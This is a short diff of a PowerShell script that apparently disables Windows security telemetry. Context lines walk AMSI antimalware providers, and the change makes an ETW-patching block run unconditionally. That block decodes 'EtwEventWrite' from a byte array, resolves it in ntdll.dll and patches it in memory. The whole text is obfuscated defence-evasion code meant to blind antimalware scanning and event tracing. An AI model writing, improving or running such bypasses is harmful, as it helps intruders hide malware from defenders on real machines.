@@ -118,7 +118,7 @@ while ($AntimalwareProvider -ne 0)
         $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36 + ($i*$PtrSize))
     }
 }
-if ($etw) {
+
     $etwFunc = [Text.Encoding]::ASCII.GetString([Byte[]](69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101))
     $etwAddr = Get-Function ("nt{0}.dll" -f "dll") $etwFunc
     if ($etwAddr -eq $null) {
@@ -154,7 +154,4 @@ if ($etw) {
                 Throw "[!] Error when patching $etwFunc"
         }
     }
-    }
 }
-
-
